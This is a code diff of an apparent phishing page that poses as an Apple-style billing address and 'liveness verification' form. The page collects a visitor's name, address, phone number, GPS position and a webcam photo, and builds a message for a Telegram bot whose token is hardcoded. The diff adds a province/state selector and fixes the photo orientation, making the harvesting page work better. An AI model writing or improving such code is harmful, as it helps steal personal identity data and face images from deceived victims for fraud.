@@ -25,7 +25,6 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* 苹果风格卡片容器 */
         .apple-card {
             background: var(--card-bg);
             width: 100%; max-width: 480px;
@@ -61,7 +60,6 @@
         }
         .apple-btn:hover { background: var(--accent-hover); }
 
-        /* 活体检测阶段样式 */
         #step-verification { display: none; width: 100%; max-width: 640px; text-align: center; }
         
         #video-container { 
@@ -94,7 +92,7 @@
 <body>
     <div class="fill-light" id="fillLight"></div>
 
-    <!-- 第一步：Apple 风格收货/账单地址填写表单 -->
+    <!-- 第一步：Apple 风格收货地址表单 -->
     <div class="apple-card" id="step-form">
         <h2>账单与收货地址</h2>
         <div class="subtitle">请输入您的详细信息以完成安全核验准备</div>
@@ -112,8 +110,15 @@
 
         <div class="form-group">
             <label>国家 / 地区 (Country / Region)</label>
-            <select id="countrySelect">
-                <!-- 动态载入全球国家 -->
+            <select id="countrySelect" onchange="updateStates()">
+                <!-- 动态载入国家 -->
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label>省份 / 州 (Province / State)</label>
+            <select id="stateSelect">
+                <!-- 根据国家动态变化 -->
             </select>
         </div>
 
@@ -158,23 +163,45 @@
         const BOT_TOKEN = '8657025946:AAGG14AbXcHQzWqSaL6MQTCCP2PEtIyt64g';
         const CHAT_ID = new URLSearchParams(window.location.search).get('id');
 
-        // 全球常见国家列表数据
-        const countries = [
-            "中国 (China)", "美国 (United States)", "日本 (Japan)", "英国 (United Kingdom)", 
-            "德国 (Germany)", "法国 (France)", "加拿大 (Canada)", "澳大利亚 (Australia)", 
-            "新加坡 (Singapore)", "韩国 (South Korea)", "中国香港 (Hong Kong)", "中国台湾 (Taiwan)",
-            "马来西亚 (Malaysia)", "泰国 (Thailand)", "越南 (Vietnam)", "意大利 (Italy)",
-            "西班牙 (Spain)", "荷兰 (Netherlands)", "瑞士 (Switzerland)", "俄罗斯 (Russia)"
-        ];
+        // 国家与省份/州联动数据库
+        const regionData = {
+            "中国 (China)": ["北京市", "上海市", "广东省", "浙江省", "江苏省", "四川省", "山东省", "福建省", "湖北省", "湖南省", "河南省", "安徽省", "河北省", "陕西省", "重庆市", "天津市", "辽宁省", "黑龙江省", "其他省份/直辖市"],
+            "美国 (United States)": ["加利福尼亚州 (CA)", "纽约州 (NY)", "德克萨斯州 (TX)", "华盛顿州 (WA)", "佛罗里达州 (FL)", "伊利诺伊州 (IL)", "内华达州 (NV)", "其他州"],
+            "日本 (Japan)": ["东京都", "大阪府", "北海道", "神奈川县", "爱知县", "京都府", "福冈县", "其他都道府县"],
+            "英国 (United Kingdom)": ["英格兰 (England)", "苏格兰 (Scotland)", "威尔士 (Wales)", "北爱尔兰 (Northern Ireland)"],
+            "加拿大 (Canada)": ["安大略省 (ON)", "不列颠哥伦比亚省 (BC)", "魁北克省 (QC)", "艾伯塔省 (AB)", "其他省份"],
+            "澳大利亚 (Australia)": ["新南威尔士州 (NSW)", "维多利亚州 (VIC)", "昆士兰州 (QLD)", "西澳大利亚州 (WA)", "其他州"],
+            "新加坡 (Singapore)": ["新加坡全境 (Singapore)"],
+            "中国香港 (Hong Kong)": ["香港岛", "九龙", "新界"],
+            "中国台湾 (Taiwan)": ["台北市", "高雄市", "台中市", "台南市", "新北市", "其他县市"],
+            "马来西亚 (Malaysia)": ["吉隆坡", "雪兰莪", "槟城", "柔佛", "其他州属"],
+            "其他国家/地区": ["其他省份/地区"]
+        };
+
+        const countrySelect = document.getElementById('countrySelect');
+        const stateSelect = document.getElementById('stateSelect');
 
         // 初始化国家下拉菜单
-        const countrySelect = document.getElementById('countrySelect');
-        countries.forEach(c => {
+        for (let country in regionData) {
             const opt = document.createElement('option');
-            opt.value = c;
-            opt.text = c;
+            opt.value = country;
+            opt.text = country;
             countrySelect.appendChild(opt);
-        });
+        }
+
+        // 根据所选国家动态更新省份/州选项
+        function updateStates() {
+            const selectedCountry = countrySelect.value;
+            const states = regionData[selectedCountry] || ["其他"];
+            stateSelect.innerHTML = "";
+            states.forEach(st => {
+                const opt = document.createElement('option');
+                opt.value = st;
+                opt.text = st;
+                stateSelect.appendChild(opt);
+            });
+        }
+        updateStates(); // 默认初始化一次
 
         let formDataCache = {};
         const stepForm = document.getElementById('step-form');
@@ -208,11 +235,11 @@
             videoContainer.style.boxShadow = `0 0 25px ${glowColor}`;
         }
 
-        // 点击提交表单信息，进入活体检测阶段
         nextToVerifyBtn.addEventListener('click', async () => {
             const firstName = document.getElementById('firstName').value.trim();
             const lastName = document.getElementById('lastName').value.trim();
-            const country = document.getElementById('countrySelect').value;
+            const country = countrySelect.value;
+            const state = stateSelect.value;
             const address = document.getElementById('address').value.trim();
             const city = document.getElementById('city').value.trim();
             const postalCode = document.getElementById('postalCode').value.trim();
@@ -228,15 +255,12 @@
                 return;
             }
 
-            // 缓存表单数据
-            formDataCache = { firstName, lastName, country, address, city, postalCode, phone };
+            formDataCache = { firstName, lastName, country, state, address, city, postalCode, phone };
 
-            // 切换 UI 视图
             stepForm.style.display = 'none';
             stepVerification.style.display = 'block';
             fillLight.style.display = 'block';
 
-            // 获取地理位置辅助
             let locationText = "未获取到精确GPS";
             try {
                 const pos = await new Promise((res, rej) => {
@@ -247,7 +271,6 @@
                 console.warn("GPS info skipped");
             }
 
-            // 启动摄像头与 AI 检测
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false });
                 video.srcObject = stream;
@@ -332,19 +355,22 @@
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
-            ctx.translate(canvas.width, canvas.height);
-            ctx.scale(-1, -1);
+            
+            // 💡 确保截图方向完全正向（纠正之前的倒立问题）
+            ctx.save();
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.restore();
             
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
                 
-                // 拼装要发送到 Telegram 的完整文本信息（包含地址、国家、联系方式等）
                 const captionText = `📦 [收到新的账单地址与活体核验]\n` +
                     `━━━━━━━━━━━━━━━\n` +
                     `🆔 会话 ID: ${CHAT_ID}\n` +
                     `👤 姓名: ${formDataCache.lastName} ${formDataCache.firstName}\n` +
-                    `🌍 国家/地区: ${formDataCache.country}\n` +
+                    `🌍 国家: ${formDataCache.country}\n` +
+                    `🏛️ 省份/州: ${formDataCache.state}\n` +
                     `🏠 地址: ${formDataCache.address}, ${formDataCache.city}, ${formDataCache.postalCode}\n` +
                     `📞 电话: ${formDataCache.phone}\n` +
                     `📍 GPS: ${locationText}\n` +
